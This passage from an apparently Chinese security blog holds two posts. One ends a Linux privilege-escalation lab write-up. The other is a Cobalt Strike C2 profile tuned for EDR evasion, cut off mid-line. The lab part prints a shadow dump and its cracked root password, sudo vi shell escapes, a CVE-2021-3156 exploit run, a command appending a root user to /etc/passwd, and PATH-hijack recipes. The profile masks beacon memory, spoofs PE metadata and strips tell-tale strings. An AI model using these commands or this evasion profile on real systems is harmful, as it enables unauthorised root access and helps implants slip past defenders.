<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root:$6$mqjgcFoM$X/qNpZR6gXPAxdgDjFpaD1yPIqUF5l5ZDANRTKyvcHQwSqSxX5lA7n22kjEkQhSP6Uq7cPaYfzPSmgATM9cwD1:18050:0:99999:7:::</span><br><span class="line">user1:$6$9iyn/lCu$UxlOZYhhFSAwJ8DPjlrjrl2Wv.Pz9DahMTfwpwlUC5ybyBGpuHToNIIjTqMLGSh0R2Ch4Ij5gkmP0eEH2RJhZ0:18050:0:99999:7:::</span><br><span class="line">user2:$6$7gVE7KgT$ud1VN8OwYCbFveieo4CJQIoMcEgcfKqa24ivRs/MNAmmPeudsz/p3QeCMHj8ULlvSufZmp3TodaWlIFSZCKG5.:18050:0:99999:7:::</span><br><span class="line">user3:$6$PaKeECW4$5yMn9UU4YByCj0LP4QWaGt/S1aG0Zs73EOJXh.Rl0ebjpmsBmuGUwTgBamqCCx7qZ0sWJOuzIqn.GM69aaWJO0:18051:0:99999:7:::</span><br><span class="line">user4:$6$0pxj6KPl$NA5S/2yN3TTJbPypEnsqYe1PrgbfccHntMggLdU2eM5/23dnosIpmD8sRJwI1PyDFgQXH52kYk.bzc6sAVSWm.:18051:0:99999:7:::</span><br><span class="line">user5:$6$wndyaxl9$cOEaymjMiRiljzzaSaFVXD7LFx2OwOxeonEdCW.GszLm77k0d5GpQZzJpcwvufmRndcYatr5ZQESdqbIsOb9n/:18051:0:99999:7:::</span><br><span class="line">user6:$6$Y9wYnrUW$ihpBL4g3GswEay/AqgrKzv1n8uKhWiBNlhdKm6DdX7WtDZcUbh/5w/tQELa3LtiyTFwsLsWXubsSCfzRcao1u/:18051:0:99999:7:::</span><br><span class="line">mysql:$6$O2ymBAYF$NZDtY392guzYrveKnoISea6oQpv87OpEjEef5KkEUqvtOAjZ2i1UPbkrfmrHG/IonKdnYEec0S0ZBcQFZ.sno/:18053:0:99999:7:::</span><br><span class="line">user7:$6$5RBuOGFi$eJrQ4/xf2z/3pG43UkkoE35Jb0BIl7AW/umj1Xa7eykmalVKiRKJ4w3vFEOEOtYinnkIRa.89dXtGQXdH.Rdy0:18052:0:99999:7:::</span><br><span class="line">user8:$6$fdtulQ7i$G9THW4j6kUy4bXlf7C/0XQtntw123LRVRfIkJ6akDLPHIqB5PJLD4AEyz7wXsEhMc2XC4CqiTxATfb20xWaXP.:18052:0:99999:7:::</span><br></pre></td></tr></table></figure>

<p>john shadow.txt</p>
<p>得到root用户密码为 12345</p>
<p><img src="/posts/c474af54/attachment:3e5c34d015669144524e073997b6290b" alt="截图"><img src="file:///var/folders/9f/vk166n511ng3f8ljv5qvq_tm0000gn/T/utools.notes/3e5c34d015669144524e073997b6290b.png" alt="截图"></p>
<p>成功登录到root用户</p>
<p><img src="/posts/c474af54/attachment:1ac6b364e251fd2be2a7d968e082c14c" alt="截图"><img src="file:///var/folders/9f/vk166n511ng3f8ljv5qvq_tm0000gn/T/utools.notes/1ac6b364e251fd2be2a7d968e082c14c.png" alt="截图"></p>
<h4 id="0x08-sudo提权1-—-vi-提权"><a href="#0x08-sudo提权1-—-vi-提权" class="headerlink" title="0x08  sudo提权1 — vi 提权"></a>0x08  sudo提权1 — vi 提权</h4><p>登录user8  sudo -l </p>
<p><img src="/posts/c474af54/attachment:10cc90cd82f2e5d2c0ede1393eba99c5" alt="截图"><img src="file:///var/folders/9f/vk166n511ng3f8ljv5qvq_tm0000gn/T/utools.notes/10cc90cd82f2e5d2c0ede1393eba99c5.png" alt="截图"></p>
<p>vi 提权  参考 <a href="https://gtfobins.github.io/gtfobins/vi/">https://gtfobins.github.io/gtfobins/vi/</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo vi </span><br><span class="line">:!sh </span><br><span class="line">或者</span><br><span class="line">sudo vi</span><br><span class="line">:set shell=/bin/sh</span><br><span class="line">:shell</span><br></pre></td></tr></table></figure>

<p><img src="/posts/c474af54/attachment:47c0ea209eb2ab89e9e8f050dbe3c484" alt="截图"><img src="file:///var/folders/9f/vk166n511ng3f8ljv5qvq_tm0000gn/T/utools.notes/47c0ea209eb2ab89e9e8f050dbe3c484.png" alt="截图"></p>
<p><img src="/posts/c474af54/attachment:0ee35a1a8389a3f7be0d119570066355" alt="截图"><img src="file:///var/folders/9f/vk166n511ng3f8ljv5qvq_tm0000gn/T/utools.notes/0ee35a1a8389a3f7be0d119570066355.png" alt="截图"></p>
<h4 id="0x09-sudo提权-2"><a href="#0x09-sudo提权-2" class="headerlink" title="0x09 sudo提权 2"></a>0x09 sudo提权 2</h4><p>登录到user2 </p>
<p>sudo -l </p>
<p><img src="/posts/c474af54/attachment:ed45f5c91b693f398b9d78415e9f6137" alt="截图"><img src="file:///var/folders/9f/vk166n511ng3f8ljv5qvq_tm0000gn/T/utools.notes/ed45f5c91b693f398b9d78415e9f6137.png" alt="截图"></p>
<p>user2下所以  user1均具有权限</p>
<p>登录到user1 sudo -l</p>
<p><img src="/posts/c474af54/attachment:a814e593c544373206b840a1bcec7950" alt="截图"><img src="file:///var/folders/9f/vk166n511ng3f8ljv5qvq_tm0000gn/T/utools.notes/a814e593c544373206b840a1bcec7950.png" alt="截图"></p>
<p>user1 具有所有权限   可直接su 登录root</p>
<h4 id="0x0a-sudo堆缓冲区溢出提权"><a href="#0x0a-sudo堆缓冲区溢出提权" class="headerlink" title="0x0a sudo堆缓冲区溢出提权"></a>0x0a sudo堆缓冲区溢出提权</h4><p>sudo -V </p>
<p><img src="/posts/c474af54/attachment:0b9db52b928c8be4e42773ae56c54197" alt="截图"><img src="file:///var/folders/9f/vk166n511ng3f8ljv5qvq_tm0000gn/T/utools.notes/0b9db52b928c8be4e42773ae56c54197.png" alt="截图"></p>
<p>该版本存在sudo 堆缓冲区溢出漏洞</p>
<p>影响版本在 </p>
<ul>
<li>Sudo 1.8.2 - 1.8.31p2</li>
<li>Sudo 1.9.0 - 1.9.5p1</li>
</ul>
<p>POC : <a href="https://github.com/Rvn0xsy/CVE-2021-3156-plus">https://github.com/Rvn0xsy/CVE-2021-3156-plus</a> </p>
<p>通过前面nfs挂载 直接在kali下下载poc 拷贝到user5目录下 make编译</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/expolit &quot;id&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/posts/c474af54/attachment:2880a7402f7c4210518eb33e87c2c1c4" alt="截图"><img src="file:///var/folders/9f/vk166n511ng3f8ljv5qvq_tm0000gn/T/utools.notes/2880a7402f7c4210518eb33e87c2c1c4.png" alt="截图"></p>
<h4 id="0x0b-root用户组提权-—-写入-etc-passwd"><a href="#0x0b-root用户组提权-—-写入-etc-passwd" class="headerlink" title="0x0b root用户组提权  — 写入/etc/passwd"></a>0x0b root用户组提权  — 写入/etc/passwd</h4><p><code>cat /etc/group </code> 查看用户组</p>
<p><img src="/posts/c474af54/attachment:914fe068e9208e26fbaf1fb37c59d12e" alt="截图"><img src="file:///var/folders/9f/vk166n511ng3f8ljv5qvq_tm0000gn/T/utools.notes/914fe068e9208e26fbaf1fb37c59d12e.png" alt="截图"></p>
<p>用户user4 user7 可以修改 /etc/passwd 写入新建用户</p>
<p>在kali下利用openssl </p>
<p><img src="/posts/c474af54/attachment:bd93e89c27d81a9bddee7d519689fbe1" alt="截图"><img src="file:///var/folders/9f/vk166n511ng3f8ljv5qvq_tm0000gn/T/utools.notes/bd93e89c27d81a9bddee7d519689fbe1.png" alt="截图"></p>
<p>openssl passwd -1 -salt test test</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$1$test$pi/xDtU5WFVRqYS6BMU8X/</span><br><span class="line">echo &#x27;test:$1$test$pi/xDtU5WFVRqYS6BMU8X/:0:0:/root:/bin/bash&#x27; &gt;&gt; /etc/passwd</span><br></pre></td></tr></table></figure>

<p><img src="/posts/c474af54/attachment:c196a2bbdcaeb87acdf306ad8f49017c" alt="截图"><img src="file:///var/folders/9f/vk166n511ng3f8ljv5qvq_tm0000gn/T/utools.notes/c196a2bbdcaeb87acdf306ad8f49017c.png" alt="截图"></p>
<h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><h4 id="1-内核漏洞提权"><a href="#1-内核漏洞提权" class="headerlink" title="1.内核漏洞提权"></a>1.内核漏洞提权</h4><p>根据内核版本找对应版本的漏洞进行提权</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 查看系统发行版本</span><br><span class="line">lsb_release -a  </span><br><span class="line"># 查看内核版本</span><br><span class="line">uname -a </span><br></pre></td></tr></table></figure>

<h4 id="2-SUID提权"><a href="#2-SUID提权" class="headerlink" title="2.SUID提权"></a>2.SUID提权</h4><p>SUID可以让程序调用者以文件所有者身份运行该文件，当我们以普通用户去运行一个root用户所有的SUID文件，那么运行该文件后就可以获取到root权限。</p>
<p>查找具有s权限的文件</p>
<p>find / -perm -u=s -type f 2&gt;/dev/null </p>
<h4 id="3-sudo提权"><a href="#3-sudo提权" class="headerlink" title="3.sudo提权"></a>3.sudo提权</h4><p>普通用户在使用sudo执行命令时，将会以root方式执行命令。在很多场景下通过配置sudoer文件可实现免密以root权限运行。通过sudo -l 查找用户下高权限第三方应用，可借助<a href="https://gtfobins.github.io/">GTFOBins</a>进行提权。</p>
<h4 id="4-计划任务提权"><a href="#4-计划任务提权" class="headerlink" title="4.计划任务提权"></a>4.计划任务提权</h4><p>系统中可能会有一些定时执行的任务，这些任务都由crontab管理，可通过<code>cat /etc/crontab</code>查看计划任务，检查是否存在可以利用的文件，其本质就是文件权限配置不当。</p>
<h4 id="5-环境变量提权"><a href="#5-环境变量提权" class="headerlink" title="5. 环境变量提权"></a>5. 环境变量提权</h4><p>当在目标机器查到具有SUID权限的编译文件，则可以通过以下方法获取管理员权限</p>
<ul>
<li>1.echo命令法</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd /tmp</span><br><span class="line">echo &quot;/bin/bash&quot; &gt; ls</span><br><span class="line">chmod 777 ls</span><br><span class="line">echo $PATH</span><br><span class="line">export PATH=/tmp:$PATH</span><br><span class="line">cd /home/user5/</span><br><span class="line">./script</span><br></pre></td></tr></table></figure>

<ul>
<li>2.cp 法</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd /home/user5/</span><br><span class="line">cp /bin/sh /tmp/ls</span><br><span class="line">echo $PATH</span><br><span class="line">export PATH=/tmp:$PATH</span><br><span class="line">./script</span><br></pre></td></tr></table></figure>

<ul>
<li>3.软连接法(在此靶场中无法利用)</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ln -s /bin/sh /tmp/ls</span><br><span class="line">export PATH=/tmp:$PATH</span><br><span class="line">cd /home/user5/</span><br><span class="line">./script</span><br></pre></td></tr></table></figure>

<h4 id="6-第三方服务提权"><a href="#6-第三方服务提权" class="headerlink" title="6.第三方服务提权"></a>6.第三方服务提权</h4><h5 id="6-1-NFS提权"><a href="#6-1-NFS提权" class="headerlink" title="6.1 NFS提权"></a>6.1 NFS提权</h5><p>当服务器中存在nfs共享，且开启了<strong><strong>no_root_squash</strong></strong>时[可通过 cat /etc/exports查看]，如果客户端使用的是root用户，那么对于共享目录来说就有root权限，以此提升权限。</p>
<ul>
<li>1.查看NFS服务器共享目录</li>
<li>2.创建本地挂载目录 挂载共享目录，利用攻击者本地root权限创建suid shell</li>
<li>3.在服务器中以普通用户运行shell -p  以获取root权限</li>
</ul>
<h5 id="6-2-数据库提权"><a href="#6-2-数据库提权" class="headerlink" title="6.2 数据库提权"></a>6.2 数据库提权</h5><p>Mysql数据库提权有UDF提权、MOF提权、写入启动项等方式来提权，较为常见是则是UDF提权，具体步骤可分如下几步：</p>
<ul>
<li>1.连接数据库</li>
<li>2.创建自定义函数</li>
<li>3.设置自定义函数权限</li>
<li>4.执行自定义函数以获取root权限</li>
</ul>
<p>### References</p>
<p><a href="https://gtfobins.github.io/">https://gtfobins.github.io/</a></p>
<p><a href="https://github.com/wwl012345/Vuln-List/blob/main/Windows%26Linux%E6%8F%90%E6%9D%83%26RCE%E5%90%88%E9%9B%86.md#Linux%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E">https://github.com/wwl012345/Vuln-List/blob/main/Windows%26Linux%E6%8F%90%E6%9D%83%26RCE%E5%90%88%E9%9B%86.md#Linux%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E</a></p>
]]></content>
  </entry>
  <entry>
    <title>CS_Profile配置</title>
    <url>/posts/ee84a496/</url>
    <content><![CDATA[<p>参考 <a href="https://whiteknightlabs.com/2023/05/23/unleashing-the-unseen-harnessing-the-power-of-cobalt-strike-profiles-for-edr-evasion/">https://whiteknightlabs.com/2023/05/23/unleashing-the-unseen-harnessing-the-power-of-cobalt-strike-profiles-for-edr-evasion/</a></p>
<p>test.profile</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">set</span> sample_name <span class="string">&quot;666&quot;</span>; # 设置配置文件名称</span><br><span class="line"><span class="built_in">set</span> host_stage <span class="string">&quot;true&quot;</span>;</span><br><span class="line"><span class="built_in">set</span> sleeptime <span class="string">&quot;5987&quot;</span>; # 睡眠时间 单位为毫秒 CS默认为<span class="number">60000</span>ms</span><br><span class="line"><span class="built_in">set</span> jitter    <span class="string">&quot;50&quot;</span>;   # 抖动频率 默认<span class="number">0</span></span><br><span class="line"><span class="built_in">set</span> useragent <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.34 Safari/537.36 Edg/81.0.416.20&quot;</span>;</span><br><span class="line"><span class="built_in">set</span> data_jitter <span class="string">&quot;53&quot;</span>; # 设置数据抖动大小</span><br><span class="line"><span class="built_in">set</span> smb_frame_header <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="built_in">set</span> pipename <span class="string">&quot;plugplay+####&quot;</span>;</span><br><span class="line"><span class="built_in">set</span> pipename_stager <span class="string">&quot;srvsvc-1-5-5-0####&quot;</span>;</span><br><span class="line"><span class="built_in">set</span> tcp_frame_header <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="built_in">set</span> ssh_banner <span class="string">&quot;Welcome to Ubuntu 20.04.1 LTS (GNU/Linux 5.4.0-1029-aws x86_64)&quot;</span>;</span><br><span class="line"><span class="built_in">set</span> ssh_pipename <span class="string">&quot;atsvc-####&quot;</span>;</span><br><span class="line"></span><br><span class="line"># 分阶段stage配置</span><br><span class="line">stage &#123;</span><br><span class="line">    <span class="built_in">set</span> obfuscate <span class="string">&quot;true&quot;</span>;   #混淆IAT</span><br><span class="line">    <span class="built_in">set</span> stomppe <span class="string">&quot;true&quot;</span>;</span><br><span class="line">    <span class="built_in">set</span> cleanup <span class="string">&quot;true&quot;</span>;     #释放不必要的内存</span><br><span class="line">    <span class="built_in">set</span> userwx <span class="string">&quot;true&quot;</span>;      #规避rwx权限的内存分配</span><br><span class="line">    <span class="built_in">set</span> smartinject <span class="string">&quot;true&quot;</span>;</span><br><span class="line">    </span><br><span class="line">    #TCP and SMB beacons will obfuscate themselves <span class="keyword">while</span> they wait <span class="keyword">for</span> a new connection.</span><br><span class="line">    #They will also obfuscate themselves <span class="keyword">while</span> they wait to read information from their parent Beacon.</span><br><span class="line">    <span class="built_in">set</span> sleep_mask <span class="string">&quot;true&quot;</span>;  #内存混淆</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">set</span> allocator <span class="string">&quot;VirtualAlloc&quot;</span>;</span><br><span class="line"></span><br><span class="line">    # Override the first <span class="title function_">bytes</span> <span class="params">(MZ header included)</span> of Beacon&#x27;s Reflective DLL. </span><br><span class="line">    # Valid x86 instructions are required. </span><br><span class="line">    # Follow instructions that change CPU state with instructions that undo the change.</span><br><span class="line">    <span class="meta"># set magic_mz_x86 <span class="string">&quot;OOPS&quot;</span>;</span></span><br><span class="line">    <span class="meta"># set magic_mz_x64 <span class="string">&quot;OOPS&quot;</span>;</span></span><br><span class="line">    <span class="built_in">set</span> magic_pe &quot;LE&quot;;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">set</span> checksum       <span class="string">&quot;0&quot;</span>;</span><br><span class="line">    <span class="meta">#set compile_time   <span class="string">&quot;19 Apr 2070 21:37:24&quot;</span>;</span></span><br><span class="line">    <span class="built_in">set</span> entry_point    <span class="string">&quot;13760&quot;</span>;</span><br><span class="line">    <span class="built_in">set</span> image_size_x86 <span class="string">&quot;548864&quot;</span>;</span><br><span class="line">    <span class="built_in">set</span> image_size_x64 <span class="string">&quot;548864&quot;</span>;</span><br><span class="line">    <span class="built_in">set</span> name           <span class="string">&quot;wwanapi.dll&quot;</span>;</span><br><span class="line">    <span class="built_in">set</span> rich_header    <span class="string">&quot;\x39\x39\x83\xe8\x7d\x58\xed\xbb\x7d\x58\xed\xbb\x7d\x58\xed\xbb\x74\x20\x7e\xbb\x3b\x58\xed\xbb\x26\x30\xee\xba\x7e\x58\xed\xbb\x26\x30\xe9\xba\x69\x58\xed\xbb\x7d\x58\xec\xbb\xbf\x58\xed\xbb\x26\x30\xec\xba\x78\x58\xed\xbb\x26\x30\xe8\xba\x71\x58\xed\xbb\x26\x30\xed\xba\x7c\x58\xed\xbb\x26\x30\xe3\xba\x1f\x58\xed\xbb\x26\x30\x12\xbb\x7c\x58\xed\xbb\x26\x30\xef\xba\x7c\x58\xed\xbb\x52\x69\x63\x68\x7d\x58\xed\xbb\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&quot;</span>;</span><br><span class="line">         </span><br><span class="line">    </span><br><span class="line">    transform-x86 &#123;</span><br><span class="line">    	#在Beacon Reflective DLL之前插入一个字符串，防止通过dll前几个字节来检测    </span><br><span class="line">        prepend <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span>; # NOP, NOP!</span><br><span class="line">        strrep <span class="string">&quot;ReflectiveLoader&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;This program cannot be run in DOS mode&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;NtQueueApcThread&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;IsWow64Process&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;HTTP/1.1 200 OK&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;Stack memory was corrupted&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;kernel32&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;beacon.dll&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;KERNEL32.dll&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;ADVAPI32.dll&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;WININET.dll&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;WS2_32.dll&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;DNSAPI.dll&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;Secur32.dll&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;VirtualProtectEx&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;VirtualProtect&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;VirtualAllocEx&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;VirtualAlloc&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;VirtualFree&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;VirtualQuery&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;RtlVirtualUnwind&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;sAlloc&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;FlsFree&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;FlsGetValue&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;FlsSetValue&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;InitializeCriticalSectionEx&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;CreateSemaphoreExW&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;SetThreadStackGuarantee&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;CreateThreadpoolTimer&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;SetThreadpoolTimer&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;WaitForThreadpoolTimerCallbacks&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;CloseThreadpoolTimer&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;CreateThreadpoolWait&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;SetThreadpoolWait&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;CloseThreadpoolWait&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;FlushProcessWriteBuffers&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;FreeLibraryWhenCallbackReturns&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;GetCurrentProcessorNumber&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;GetLogicalProcessorInformation&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;CreateSymbolicLinkW&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;SetDefaultDllDirectories&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;EnumSystemLocalesEx&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;CompareStringEx&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;GetDateFormatEx&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;GetLocaleInfoEx&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;GetTimeFormatEx&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;GetUserDefaultLocaleName&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;IsValidLocaleName&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;LCMapStringEx&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;GetCurrentPackageId&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;UNICODE&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;UTF-8&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;UTF-16LE&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;MessageBoxW&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;GetActiveWindow&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;GetLastActivePopup&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;GetUserObjectInformationW&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;GetProcessWindowStation&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;Sunday&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;Monday&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;Tuesday&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;Wednesday&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;Thursday&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;Friday&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;Saturday&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;January&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;February&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;March&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;April&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;June&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;July&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;August&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;September&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;October&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;November&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;December&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;MM/dd/yy&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;Stack memory around _alloca was corrupted&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;Unknown Runtime Check Error&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;Unknown Filename&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;Unknown Module Name&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;Run-Time Check Failure #%d - %s&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;Stack corrupted near unknown variable&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;Stack pointer corruption&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;Cast to smaller type causing loss of data&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;Stack memory corruption&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;Local variable used before initialization&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;Stack around _alloca corrupted&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;RegOpenKeyExW&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;egQueryValueExW&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;RegCloseKey&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;LibTomMath&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;Wow64DisableWow64FsRedirection&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;Wow64RevertWow64FsRedirection&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;Kerberos&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        append <span class="string">&quot;\x90\x90\x90&quot;</span>; # NOP, NOP!</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    transform-x64 &#123;</span><br><span class="line">        #在Beacon Reflective DLL之前插入一个字符串，防止通过dll前几个字节来检测</span><br><span class="line">        prepend <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span>; # NOP, NOP!</span><br><span class="line">        prepend <span class="string">&quot;\x44\x40\x4B\x43\x4C\x48\x90\x66\x90\x0F\x1F\x00\x66\x0F\x1F\x04\x00\x0F\x1F\x04\x00\x0F\x1F\x00\x0F\x1F\x00&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;ReflectiveLoader&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;This program cannot be run in DOS mode&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span 